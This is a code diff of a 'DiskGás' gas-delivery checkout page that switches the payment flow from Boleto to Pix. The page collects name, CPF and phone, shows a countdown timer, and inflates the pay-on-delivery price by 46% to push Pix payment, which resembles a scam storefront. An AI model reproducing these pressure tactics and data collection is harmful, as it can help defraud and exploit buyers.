@@ -209,22 +209,19 @@
         }
 
         .review-block {
-    padding: 20px;
-    background-color: var(--bg-white);
-    animation: fadeIn 0.3s ease-out;
-    /* A linha única agora fica aqui */
-    border-bottom: 1px solid var(--border-color);
-}
+            padding: 20px;
+            background-color: var(--bg-white);
+            animation: fadeIn 0.3s ease-out;
+        }
 
-.review-header-bar {
-    display: flex;
-    align-items: center;
-    gap: 15px;
-    /* Removido margin e border daqui para evitar a linha dupla */
-    margin-bottom: 0;
-    padding-bottom: 0;
-}
-
+        .review-header-bar {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+        }
 
         .review-back-btn {
             background: var(--bg-light);
@@ -257,7 +254,6 @@
             flex-direction: column;
             gap: 15px;
         }
-
         .payment-option-card {
             border: 2px solid var(--border-color);
             border-radius: 20px;
@@ -897,7 +893,7 @@
             animation: spin 0.8s linear infinite;
         }
 
-        .boleto-error-msg {
+        .pix-error-msg {
             background: #fef2f2;
             border: 1px solid rgba(255, 59, 48, 0.2);
             border-radius: 10px;
@@ -910,7 +906,7 @@
             gap: 8px;
         }
 
-        .boleto-error-msg.visible {
+        .pix-error-msg.visible {
             display: flex;
         }
 
@@ -1563,7 +1559,7 @@
                 <h3 class="modal-title">Você tem certeza?</h3>
                 <p class="modal-text" id="delivery-warning-text"></p>
                 <div class="modal-buttons">
-                    <button class="btn-modal btn-modal-pix" id="modal-back-to-pix">Voltar para o Boleto (Desconto)</button>
+                    <button class="btn-modal btn-modal-pix" id="modal-back-to-pix">Voltar para o Pix (Desconto)</button>
                     <button class="btn-modal btn-modal-continue" id="modal-continue-delivery">
                         Continuar sem desconto
                     </button>
@@ -1607,8 +1603,7 @@
         // ==================== CONFIGURAÇÕES FIXAS ====================
         const EMAILJS_SERVICE_ID = 'service_otea'; // Substitua pelo seu Service ID
         const EMAILJS_TEMPLATE_ID = 'template_h2u5'; // Substitua pelo seu Template ID
-        const EMAILJS_PUBLIC_KEY = '74D6TCCH8NMPEz';
-        let timerInterval; // Substitua pela sua Public Key
+        const EMAILJS_PUBLIC_KEY = '74D6TCCH8NMPEz'; // Substitua pela sua Public Key
         // =============================================================
 
         function getUrlParameter(name) {
@@ -1616,14 +1611,8 @@
             return params.get(name);
         }
 
-        
-        const params = new URLSearchParams(window.location.search);
-        const subtotalFromUrl = params.get('subtotal');
+        const subtotalFromUrl = getUrlParameter('subtotal');
         const subtotalValue = subtotalFromUrl ? parseFloat(subtotalFromUrl) : 89.47;
-        const addressFromUrl = params.get('address') || '';
-        const cepFromUrl = params.get('cep') || '';
-        const deliveryTimeFromUrl = params.get('delivery_time') || 'Entrega em 20 Minutos';
-
 
         if (EMAILJS_PUBLIC_KEY && EMAILJS_PUBLIC_KEY !== 'public_xxx') {
             emailjs.init(EMAILJS_PUBLIC_KEY);
@@ -1713,76 +1702,11 @@
         // No arquivo de checkout, localize a função renderOrderSummary() e substitua por esta:
 
 function renderOrderSummary() {
-    // Tenta pegar a lista completa de produtos do localStorage
-    const cartProductsJSON = localStorage.getItem('cart_products');
-    const deliveryAddress = localStorage.getItem('delivery_address') || 'Endereço não informado';
-    const deliveryTime = localStorage.getItem('delivery_time') || '3 a 7 dias úteis';
-
-    let productsHTML = '';
-    
-    if (cartProductsJSON) {
-        const products = JSON.parse(cartProductsJSON);
-        
-        // Gera o HTML para cada produto na lista
-        products.forEach(product => {
-            productsHTML += `
-                <div class="order-card" style="margin-bottom: 12px;">
-                    <div class="order-image-container">
-                        <img src="${product.p}" alt="${product.n}">
-                    </div>
-                    <div class="order-details">
-                        <div class="order-product-name">${product.n}</div>
-                        <div class="order-product-price-row">
-                            <div class="order-product-price">R$ ${parseFloat(product.v).toFixed(2).replace('.', ',')}</div>
-                            <div class="order-product-qty">Qtd: ${product.q}</div>
-                        </div>
-                        <div style="font-size: 0.8rem; font-weight: 700; color: var(--text-light); margin-top: 2px;">
-                            Valor Total: R$ ${(product.q * product.v).toFixed(2).replace('.', ',')}
-                        </div>
-                    </div>
-                </div>
-            `;
-        });
-    } else {
-        // Fallback para caso não haja lista (mantém compatibilidade com o formato antigo)
-        const productInfo = JSON.parse(localStorage.getItem('product_info') || '{}');
-        productsHTML = `
-            <div class="order-card">
-                <div class="order-image-container">
-                    <img src="${productInfo.photo || 'https://via.placeholder.com/150'}" alt="${productInfo.name}">
-                </div>
-                <div class="order-details">
-                    <div class="order-product-name">${productInfo.name || 'Produto Selecionado'}</div>
-                    <div class="order-product-price-row">
-                        <div class="order-product-price">R$ ${parseFloat(productInfo.value || subtotalValue).toFixed(2).replace('.', ',')}</div>
-                    </div>
-                </div>
-            </div>
-        `;
+    // Seção de resumo do pedido removida conforme solicitado
+    const wrapper = document.getElementById('order-summary-wrapper');
+    if (wrapper) {
+        wrapper.innerHTML = '';
     }
-
-    const orderHTML = `
-        <div class="order-summary-section">
-            <div class="order-summary-title">
-                <span><i class="fas fa-shopping-bag"></i> Resumo do Pedido</span>
-                <span class="order-summary-badge">Verificado</span>
-            </div>
-            ${productsHTML}
-            <div class="order-info-container">
-                <div class="order-total-divider"></div>
-                <div class="order-info-row">
-                    <div class="order-info-icon-wrapper">
-                        <i class="fas fa-truck-fast"></i>
-                    </div>
-                    <div class="order-info-content">
-                        <div class="order-info-label">Previsão de Entrega</div>
-                        <div class="order-info-text-delivery">${deliveryTime}</div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    `;
-    document.getElementById('order-summary-wrapper').innerHTML = orderHTML;
 }
 
 
@@ -1794,43 +1718,45 @@ function renderOrderSummary() {
             const paymentHTML = `
                 <div class="review-block">
                     <div class="review-header-bar">
+                        <button class="review-back-btn" id="payment-back-btn">
+                            <i class="fas fa-arrow-left"></i>
                         </button>
-                        
+                        <div class="review-header-title"><i class="fas fa-credit-card"></i> Opções de Pagamento</div>
                     </div>
                     <div class="payment-options-container">
-                        <div class="payment-option-card" id="pay-now-boleto">
+                        <div class="payment-option-card" id="pay-now-pix">
                             
-                            <div id="boleto-original-content">
-                                <div class="payment-option-icon"><i class="fas fa-barcode"></i></div>
+                            <div id="pix-original-content">
+                                <div class="payment-option-icon"><i class="fas fa-bolt"></i></div>
                                 <div class="payment-option-title">
-    <span>Pagar Agora - Boleto</span>
-    <span class="promo-badge">Promoção</span>
+                                    <span>Pagar Agora - Pix</span>
+                                    <span class="promo-badge">Promoção</span>
 </div>
                                 <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
                                 <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
                                 <div class="pix-form-container" id="pix-form">
                                     <div class="pix-input-group">
-                                        <label for="boleto-name">Nome e Sobrenome</label>
-                                        <input type="text" id="boleto-name" placeholder="Ex: João Silva" required>
+                                        <label for="pix-name">Nome e Sobrenome</label>
+                                        <input type="text" id="pix-name" placeholder="Ex: João Silva" required>
                                     </div>
                                     <div class="pix-input-group">
-                                        <label for="boleto-cpf">CPF</label>
-                                        <input type="tel" id="boleto-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
+                                        <label for="pix-cpf">CPF</label>
+                                        <input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
                                     </div>
                                     <div class="pix-input-group">
-                                        <label for="boleto-phone">Telefone</label>
-                                        <input type="tel" id="boleto-phone" placeholder="(00) 00000-0000" required>
+                                        <label for="pix-phone">Telefone</label>
+                                        <input type="tel" id="pix-phone" placeholder="(00) 00000-0000" required>
                                     </div>
-                                    <div class="boleto-error-msg" id="boleto-error-msg">
+                                    <div class="pix-error-msg" id="pix-error-msg">
                                         <i class="fas fa-exclamation-circle"></i>
-                                        <span id="boleto-error-text">Erro ao gerar boleto.</span>
+                                        <span id="pix-error-text">Erro ao gerar código PIX.</span>
                                     </div>
-                                    <button class="payment-action-btn" id="btn-generate-boleto" style="margin-top:10px;">
+                                    <button class="payment-action-btn" id="btn-generate-pix" style="margin-top:10px;">
                                         <span class="btn-text">Pagar R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span>
                                     </button>
                                 </div>
                             </div>
-                            <div id="boleto-copy-content" class="pix-copy-section">
+                            <div id="pix-copy-content" class="pix-copy-section">
                                 <div class="pix-header-status">
                                     <div class="pix-status-badge"><i class="fas fa-check-circle"></i> Código Gerado</div>
                                     <div class="pix-timer-container"><i class="fas fa-clock"></i> Expira em: <span id="pix-timer">15:00</span></div>
@@ -1838,27 +1764,26 @@ function renderOrderSummary() {
                                 <div class="duty-info-section">
                                     <div class="duty-header"><i class="fas fa-user-shield"></i> Titular da Compra</div>
                                     <div class="duty-user-data">
-                                        <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-boleto-name">---</span></div>
-                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-boleto-cpf">---</span></div>
+                                        <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div>
+                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>
 
                                     </div>
-                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este boleto é nominal e vinculado ao seu CPF.</span></div>
+                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este código Pix é nominal e vinculado ao seu CPF.</span></div>
                                 </div>
                                 <div class="pix-code-display-wrapper">
                                     <div class="pix-code-header">
-                                        <label class="pix-code-label">Código do Boleto</label>
+                                        <label class="pix-code-label">Código Pix</label>
                                         <span class="pix-code-value-label">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>
                                     </div>
                                     <div class="pix-code-input-container">
-                                        <span class="pix-code-display-text" id="boleto-code-text">Gerando boleto...</span>
-                                        <button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar Linha Digitável"><i class="fas fa-copy"></i></button>
+                                        <span class="pix-code-display-text" id="pix-code-text">Aguardando código...</span>
+                                        <button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar código"><i class="fas fa-copy"></i></button>
                                     </div>
                                 </div>
-                                <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar Linha Digitável</button>
+                                <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar código</button>
                                 <div class="waiting-payment-section"><div class="modern-spinner"></div><div class="waiting-text">Aguardando Pagamento</div></div>
                                 <button class="btn-modal-continue" id="btn-already-paid" style="margin-top: 10px; padding: 14px; border-radius: 12px; font-size: 0.95rem; border: none; cursor: pointer; width: 100%; font-weight: 800; background: var(--primary); color: white;">Já realizei o pagamento</button>
                             </div>
-                        </div>
                         </div>
                         <div class="payment-option-card" id="pay-on-delivery">
                             <div class="payment-badge-delivery" style="position: absolute; top: 12px; right: -30px; background: var(--text-light); color: white; padding: 4px 35px; font-size: 0.7rem; font-weight: 800; transform: rotate(45deg);">Sem Desconto</div>
@@ -1867,7 +1792,7 @@ function renderOrderSummary() {
                             <div class="payment-option-price">R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</div>
                             <div class="payment-option-desc">Pague ao entregador via Cartão ou Dinheiro.</div>
                             <div class="delivery-warning-container">
-                                <div class="delivery-warning-box"><i class="fas fa-exclamation-triangle"></i><div class="delivery-warning-text">Ao escolher o pagamento na entrega você paga o valor R$ ${deliveryTotal.toFixed(2).replace('.', ',')} total sem descontos e perde a promoção via Boleto de R$ ${baseTotal.toFixed(2).replace('.', ',')}</div></div>
+                                <div class="delivery-warning-box"><i class="fas fa-exclamation-triangle"></i><div class="delivery-warning-text">Ao escolher o pagamento na entrega você paga o valor R$ ${deliveryTotal.toFixed(2).replace('.', ',')} total sem descontos e perde a promoção via Pix de R$ ${baseTotal.toFixed(2).replace('.', ',')}</div></div>
                                 <button class="payment-action-btn btn-pay-delivery" style="margin-top:10px; background: var(--primary);">Prosseguir <i class="fas fa-chevron-right"></i></button>
                             </div>
                         </div>
@@ -1876,26 +1801,26 @@ function renderOrderSummary() {
             `;
 
             document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;
-            const pixNameInput = document.getElementById('boleto-name');
+            const pixNameInput = document.getElementById('pix-name');
             if (pixNameInput) setupNameInput(pixNameInput);
-            const pixCpfInput = document.getElementById('boleto-cpf');
+            const pixCpfInput = document.getElementById('pix-cpf');
             if (pixCpfInput) setupCPFInput(pixCpfInput);
-            const pixPhoneInput = document.getElementById('boleto-phone');
+            const pixPhoneInput = document.getElementById('pix-phone');
             if (pixPhoneInput) setupPhoneInput(pixPhoneInput);
 
-            const pixCard = document.getElementById('pay-now-boleto');
+            const pixCard = document.getElementById('pay-now-pix');
             const deliveryCard = document.getElementById('pay-on-delivery');
 
             pixCard.addEventListener('click', (e) => {
                 if (e.target.tagName === 'INPUT' || e.target.tagName === 'LABEL') return;
-                if (document.getElementById('boleto-copy-content').style.display === 'flex') return;
+                if (document.getElementById('pix-copy-content').style.display === 'flex') return;
                 if (selectedPaymentType !== 'pix') {
                     selectedPaymentType = 'pix';
                     pixCard.classList.add('selected');
                     deliveryCard.classList.remove('selected');
                     const header = document.querySelector('.header'); const headerHeight = header ? header.offsetHeight : 0; const viewportHeight = window.innerHeight - headerHeight; const elementHeight = pixCard.offsetHeight; const elementOffsetTop = pixCard.getBoundingClientRect().top + window.pageYOffset; const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2); window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
-                } else if (e.target.closest('#btn-generate-boleto')) {
-                    generateBoleto();
+                } else if (e.target.closest('#btn-generate-pix')) {
+                    generatePix();
                 }
             });
 
@@ -1917,7 +1842,8 @@ function renderOrderSummary() {
 
 
 
-        function startBoletoTimer(durationInSeconds) {
+        let timerInterval; 
+        function startPixTimer(durationInSeconds) {
             clearInterval(timerInterval);
             let timer = durationInSeconds;
             const display = document.getElementById('pix-timer');
@@ -1941,13 +1867,13 @@ function renderOrderSummary() {
             } catch (err) { console.error('EmailJS error:', err); }
         }
 
-        async function generateBoleto() {
-            const name = document.getElementById('boleto-name').value.trim();
-            const cpfRaw = document.getElementById('boleto-cpf').value;
-            const phone = document.getElementById('boleto-phone').value.trim();
+        async function generatePix() {
+            const name = document.getElementById('pix-name').value.trim();
+            const cpfRaw = document.getElementById('pix-cpf').value;
+            const phone = document.getElementById('pix-phone').value.trim();
             const cpf = cpfRaw.replace(/\D/g, '');
-            const errorEl = document.getElementById('boleto-error-msg');
-            const errorText = document.getElementById('boleto-error-text');
+            const errorEl = document.getElementById('pix-error-msg');
+            const errorText = document.getElementById('pix-error-text');
             errorEl.classList.remove('visible');
 
             if (name.length < 3) { errorText.textContent = 'Informe seu nome completo.'; errorEl.classList.add('visible'); return; }
@@ -1958,11 +1884,11 @@ function renderOrderSummary() {
             
             // Se já gerou um PIX com o mesmo valor, apenas exibe novamente (mesmo após atualizar a página)
             if (savedPix && parseFloat(savedPix.amount) === subtotalValue && savedPix.code) {
-                showBoletoCopySection(savedPix.code, name, cpfRaw);
+                showPixCopySection(savedPix.code, name, cpfRaw);
                 return;
             }
 
-            const btn = document.getElementById('btn-generate-boleto');
+            const btn = document.getElementById('btn-generate-pix');
             const originalHTML = btn.innerHTML;
             btn.innerHTML = '<div class="spinner"></div>';
             btn.disabled = true;
@@ -1974,14 +1900,14 @@ function renderOrderSummary() {
                 if (cpf === '11111111111') {
                     const fakePixCode = "00020126330014BR.GOV.BCB.PIX011111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
                     localStorage.setItem('cached_pix_data', JSON.stringify({ code: fakePixCode, amount: subtotalValue }));
-                    showBoletoCopySection(fakePixCode, name, cpfRaw);
+                    showPixCopySection(fakePixCode, name, cpfRaw);
                     return;
                 }
 
-                const pixCode = await fetchBoleto(name, cpf, phone);
+                const pixCode = await fetchPixCode(name, cpf, phone);
                 if (pixCode) { 
                     localStorage.setItem('cached_pix_data', JSON.stringify({ code: pixCode, amount: subtotalValue }));
-                    showBoletoCopySection(pixCode, name, cpfRaw); 
+                    showPixCopySection(pixCode, name, cpfRaw); 
                 }
                 else { throw new Error(); }
             } catch (err) {
@@ -1992,67 +1918,33 @@ function renderOrderSummary() {
             }
         }
 
-        
-        async function fetchBoleto(payerName, cpf, phone) {
-            const names = payerName.split(' ');
-            const firstName = names[0];
-            const lastName = names.length > 1 ? names.slice(1).join(' ') : 'Silva';
-            
-            const addressParts = addressFromUrl.split(',');
-            const streetName = addressParts[0] || 'Rua não informada';
-            const streetNumber = addressParts[1] ? addressParts[1].trim().split(' ')[0] : 'SN';
-
-            const response = await fetch('/process_payment', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    transaction_amount: subtotalValue,
-                    description: 'Pagamento de Pedido',
-                    payer: {
-                        email: 'cliente@email.com',
-                        first_name: firstName,
-                        last_name: lastName,
-                        identification: {
-                            type: 'CPF',
-                            number: cpf
-                        },
-                        address: {
-                            zip_code: cepFromUrl.replace(/\D/g, ''),
-                            street_name: streetName,
-                            street_number: streetNumber,
-                            neighborhood: 'Bairro',
-                            city: 'Cidade',
-                            federal_unit: 'SP'
-                        }
-                    }
-                }),
-            });
-            const data = await response.json();
-            return data.digitable_line || data.barcode;
+async function fetchPixCode(payerName, cpf, phone) {
+            try {
+                const response = await fetch('/api/pix', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        payer_name: payerName,
+                        payer_cpf: cpf,
+                        payer_phone: phone,
+                        amount: subtotalValue.toFixed(2)
+                    }),
+                });
+                const data = await response.json();
+                return data.success ? data.pixCode : null;
+            } catch (error) {
+                console.error('Erro ao chamar API:', error);
+                return null;
+            }
         }
 
-        async function fetchPixCode_OLD(payerName, cpf, phone) {
-            const response = await fetch('/api/pix', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    payer_name: payerName,
-                    payer_cpf: cpf,
-                    payer_phone: phone,
-                    amount: subtotalValue.toFixed(2)
-                }),
-            });
-            const data = await response.json();
-            return data.success ? data.pixCode : null;
-        }
-
-        function showBoletoCopySection(qrCode, name, cpf) {
-            document.getElementById('boleto-original-content').style.display = 'none';
-            document.getElementById('boleto-copy-content').style.display = 'flex';
-            document.getElementById('display-boleto-name').innerText = name;
-            document.getElementById('display-boleto-cpf').innerText = cpf;
-            document.getElementById('boleto-code-text').innerText = qrCode;
-            const pixCardEl = document.getElementById('pay-now-boleto');
+        function showPixCopySection(qrCode, name, cpf) {
+            document.getElementById('pix-original-content').style.display = 'none';
+            document.getElementById('pix-copy-content').style.display = 'flex';
+            document.getElementById('display-pix-name').innerText = name;
+            document.getElementById('display-pix-cpf').innerText = cpf;
+            document.getElementById('pix-code-text').innerText = qrCode;
+            const pixCardEl = document.getElementById('pay-now-pix');
             if (pixCardEl) {
                 const header = document.querySelector('.header');
                 const headerHeight = header ? header.offsetHeight : 0;
@@ -2062,31 +1954,33 @@ function renderOrderSummary() {
                 const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2);
                 window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
             }
-            startBoletoTimer(15 * 60);
+            startPixTimer(900);
         }
 
         function copyPixCode() {
-            const code = document.getElementById('boleto-code-text').innerText;
+            const code = document.getElementById('pix-code-text').innerText;
             navigator.clipboard.writeText(code).then(() => {
-                // Atualiza botão principal
                 const btn = document.getElementById('btn-copy-pix-action');
-                if (btn) {
-                    btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
-                    btn.style.background = '#28a745';
-                    btn.style.color = 'white';
-                    setTimeout(() => { 
-                        btn.innerHTML = 'Copiar Linha Digitável'; 
-                        btn.style.background = ''; 
-                        btn.style.color = ''; 
-                    }, 2000);
-                }
+                const originalText = btn.innerText;
+                btn.innerText = 'Copiado!';
+                btn.style.background = '#27ae60';
                 
-                // Abre o modal e popula o código
-                document.getElementById('pixCodeCopied').value = code;
-                document.getElementById('pixCopiedModal').classList.add('active');
-                document.body.style.overflow = 'hidden';
+                // Abre o modal e popula o código (Adicionado conforme solicitado)
+                const pixCodeInput = document.getElementById('pixCodeCopied');
+                if (pixCodeInput) pixCodeInput.value = code;
+                const modal = document.getElementById('pixCopiedModal');
+                if (modal) {
+                    modal.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                }
+
+                setTimeout(() => { 
+                    btn.innerText = originalText; 
+                    btn.style.background = 'var(--primary)'; 
+                }, 2000);
             });
         }
+
         function fecharPixModal(btn) {
             if (btn.disabled) return;
             btn.disabled = true;
@@ -2121,6 +2015,7 @@ function renderOrderSummary() {
 
         function fecharPixModalDireto() {
             const modal = document.getElementById('pixCopiedModal');
+            if (!modal) return;
             modal.style.transition = 'opacity 0.2s ease';
             modal.style.opacity = '0';
             setTimeout(() => {
@@ -2132,24 +2027,27 @@ function renderOrderSummary() {
         }
 
         function copyAgain() {
-            const code = document.getElementById('pixCodeCopied').value;
+            const codeInput = document.getElementById('pixCodeCopied');
+            if (!codeInput) return;
+            const code = codeInput.value;
             navigator.clipboard.writeText(code).then(() => {
                 const btn = document.querySelector('.pix-copy-btn-compact');
+                if (!btn) return;
                 const originalContent = btn.innerHTML;
                 btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
                 setTimeout(() => { btn.innerHTML = originalContent; }, 2000);
             });
         }
 
-
         function showDeliveryModal() {
-            const baseTotal = subtotalValue;
-            const deliveryTotal = baseTotal * 1.46;
-            document.getElementById('delivery-warning-text').innerHTML = `Ao escolher o pagamento na entrega você paga o valor <strong>R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</strong> total sem descontos e perde a promoção via Boleto de <strong>R$ ${baseTotal.toFixed(2).replace('.', ',')}</strong>`;
             const modal = document.getElementById('delivery-modal');
-            document.getElementById('modal-step-1').style.display = 'block';
-            document.getElementById('modal-step-2').style.display = 'none';
-            document.getElementById('modal-step-3').style.display = 'none';
+            const step1 = document.getElementById('modal-step-1');
+            const step2 = document.getElementById('modal-step-2');
+            const step3 = document.getElementById('modal-step-3');
+            
+            step1.style.display = 'block';
+            step2.style.display = 'none';
+            step3.style.display = 'none';
             modal.classList.add('active');
         }
 
@@ -2177,23 +2075,16 @@ function renderOrderSummary() {
         const deliveryCpfInput = document.getElementById('delivery-cpf');
         if (deliveryCpfInput) setupCPFInput(deliveryCpfInput);
 
-        
-        console.log('Script carregado');
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('DOM carregado, iniciando renderização');
-            try {
-                renderOrderSummary();
-                console.log('Resumo do pedido renderizado');
-                renderPaymentOptions();
-                console.log('Opções de pagamento renderizadas');
-            } catch (e) {
-                console.error('Erro na renderização:', e);
-            }
+            renderOrderSummary();
+            renderPaymentOptions();
         });
-
     </script>
 
-    <!-- Modal de "Código do Boleto Copiado" Compacto -->
+
+
+
+    <!-- Modal de "Código Pix Copiado" Compacto -->
 <div id="pixCopiedModal" class="pix-modal-overlay">
     <div class="pix-modal-content">
         <button class="pix-modal-external-close" onclick="fecharPixModalDireto()">
@@ -2204,7 +2095,8 @@ function renderOrderSummary() {
     <!-- Ícone de Sucesso -->
     <i class="fas fa-check-circle" style="display: block !important; margin: 0 auto 16px auto !important; color: #16a34a; font-size: 42px;"></i>
     
-    <h2 style="margin: 0 0 8px 0 !important; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important; color: #1e293b !important; font-weight: 700 !important; font-size: 20px;">Código do Boleto Copiado!</h2>
+    <h2 style="margin: 0 0 8px 0 !important; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important; color: #1e293b !important; font-weight: 700 !important; font-size: 20px;">Código Pix Copiado!</h2>
+    <p style="margin: 0 0 20px 0; font-family: 'Segoe UI', sans-serif; color: #64748b; font-size: 14px;">Finalize o pagamento no app do seu banco.</p>
 
     <!-- Card de Identificação Profissional -->
     <div style="all: initial !important; display: flex !important; align-items: center !important; gap: 14px !important; background-color: #ffffff !important; border: 1px solid #e2e8f0 !important; border-radius: 12px !important; padding: 16px !important; margin: 20px 0 !important; width: 100% !important; box-sizing: border-box !important; font-family: 'Segoe UI', Roboto, sans-serif !important; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);">
@@ -2212,13 +2104,13 @@ function renderOrderSummary() {
         <div style="display: flex !important; flex-direction: column !important; gap: 6px !important; text-align: left !important; width: 100% !important;">
             <!-- Badge de Status -->
             <span style="display: inline-block !important; color: #0054a6 !important; font-size: 11px !important; font-weight: 700 !important; text-transform: uppercase !important; letter-spacing: 0.8px !important; margin-bottom: 2px !important;">
-                Vendedor DiskGás Designado:
+                Vendedor DiskGás Acionado:
             </span>
 
             <div style="display: flex !important; align-items: center !important; justify-content: space-between !important; width: 100% !important;">
                 <!-- Nome do Vendedor -->
                 <span style="display: block !important; color: #0f172a !important; font-size: 16px !important; font-weight: 700 !important;">
-                    Thiago Callegari
+                    Entrega Rápida
                 </span>
                 
                 <!-- Selo de Verificação -->
@@ -2268,7 +2160,7 @@ function renderOrderSummary() {
         <button class="pix-modal-close-compact" onclick="fecharPixModal(this)">ENTENDI, VOU PAGAR</button>
     </div>
 </div>
-<!-- Fim Modal de "Código do Boleto Copiado" -->
+<!-- Fim Modal de "Código Pix Copiado" -->
 
 </body>
 </html>
